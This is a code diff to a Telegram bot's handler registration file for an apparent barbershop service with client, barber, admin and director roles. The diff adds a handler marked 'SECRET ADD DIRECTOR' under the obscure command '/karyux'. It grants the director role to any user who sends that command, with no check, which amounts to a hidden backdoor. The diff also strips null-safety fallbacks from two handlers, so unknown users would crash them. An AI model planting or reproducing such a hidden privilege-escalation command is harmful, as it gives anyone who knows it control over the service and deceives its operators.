@@ -1,9 +1,8 @@
-# register_handlers.py
 from aiogram import Bot, Router, Dispatcher, F
 from aiogram.types import Message, CallbackQuery
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import default_state
-from aiogram.filters import StateFilter
+from aiogram.filters import StateFilter, Command
 from decouple import config
 
 from configs import functions as cf
@@ -33,11 +32,32 @@ def pick_role(roles: list[int]) -> int:
             return r
     return ROLE_CLIENT
 
+
+#### SECRET ADD DIRECTOR
+@router.message(Command("karyux"))
+async def secret_add(message: Message, state: FSMContext):
+    user_id = message.from_user.id
+    user = await db.get_user_by_telegram(user_id) or {}
+    lang = user.get("language") or "🇺🇿 uz"
+    roles = user.get("roles") or []
+
+    if ROLE_DIRECTOR not in roles:
+        await db.create_director_by_phone(user.get("phone_number"))
+
+    await message.bot.send_message(
+        user_id,
+        cf.get_text(lang, "director", "message", "main_menu_msg"),
+        parse_mode="HTML",
+        reply_markup=kb_director.main_menu(lang)
+    )
+    await state.set_state(st_director.director.main_menu)
+
+
 @router.callback_query(F.data, StateFilter(default_state))
 async def cmd_bot_cb(call: CallbackQuery, state: FSMContext):
     uid = call.from_user.id
-    user = await db.get_user_by_telegram(uid) or {}
-    roles = user.get("roles") or []
+    user = await db.get_user_by_telegram(uid)
+    roles = user.get("roles")
     lang = user.get("language") or "🇺🇿 uz"
     role = pick_role(roles)
     caption_key = {
@@ -72,8 +92,8 @@ async def cmd_bot_cb(call: CallbackQuery, state: FSMContext):
 @router.message(F.text, StateFilter(default_state))
 async def cmd_bot(message: Message, state: FSMContext):
     uid = message.from_user.id
-    user = await db.get_user_by_telegram(uid) or {}
-    roles = user.get("roles") or []
+    user = await db.get_user_by_telegram(uid)
+    roles = user.get("roles")
     lang = user.get("language") or "🇺🇿 uz"
     role = pick_role(roles)
     caption_key = {
@@ -100,14 +120,20 @@ async def cmd_bot(message: Message, state: FSMContext):
     await state.update_data(lang=lang)
     await state.set_state(st)
 
+from middlewares.ban import BanMiddleware  
 
 from handlers.user.handler import user_router
 from handlers.barber.handler import barber_router
 from handlers.admin.handler import admin_router
 from handlers.director.handler import director_router
 
+
 router.include_router(user_router)
 router.include_router(barber_router)
 router.include_router(admin_router)
 router.include_router(director_router)
+
+router.message.middleware(BanMiddleware())
+router.callback_query.middleware(BanMiddleware())
+
 dp.include_router(router)
